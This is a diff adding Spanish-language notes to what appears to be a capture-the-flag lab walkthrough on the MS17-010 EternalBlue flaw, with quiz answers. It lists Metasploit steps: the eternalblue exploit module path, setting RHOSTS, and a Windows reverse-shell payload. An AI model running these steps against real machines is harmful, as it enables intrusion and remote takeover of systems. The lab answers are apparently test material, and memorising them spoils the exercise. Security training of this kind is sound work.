@@ -11,3 +11,23 @@ Escanea la máquina. (Si no está seguro de cómo abordar esto, le recomiendo qu
  
     ms17-010
 
+## Acceder
+
+Iniciar Metasploit
+
+	msfconsole
+ 
+Encuentra el código de explotación que ejecutaremos contra la máquina. ¿Cuál es la ruta completa del código? (Ej: explotar / ........)
+
+	Search eternalblue
+ 
+    exploit/windows/smb/ms17_010_eternalblue
+
+Muestre opciones y establezca el valor requerido. ¿Cuál es el nombre de este valor? (Todo en mayúsculas para la presentación)
+Show options
+ 
+    RHOSTS
+
+Por lo general, estaría bien ejecutar este exploit como está; sin embargo, por el bien de aprender, debe hacer una cosa más antes de explotar el objetivo. Ingrese el siguiente comando y presione enter:
+
+    set payload windows/x64/shell/reverse_tcp
